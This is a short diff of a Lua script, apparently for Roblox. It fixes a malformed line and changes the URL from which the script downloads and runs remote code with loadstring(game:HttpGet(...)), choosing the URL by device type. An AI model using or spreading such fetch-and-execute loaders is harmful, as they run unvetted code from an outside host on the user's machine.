@@ -11,7 +11,7 @@ elseif isMobile then
 end
 
 if device=="PC" then
-    loadstring(game:HttpGet("loadstring(game:HttpGet("https://nexxaop.onrender.com/37fc12/raw"))()"))()
+    loadstring(game:HttpGet("https://nexxaop.onrender.com/081bd5/raw"))()
 elseif device=="Mobile" then
     loadstring(game:HttpGet("URL_DE_TU_SCRIPT_MOBILE_AQUI"))()
 end
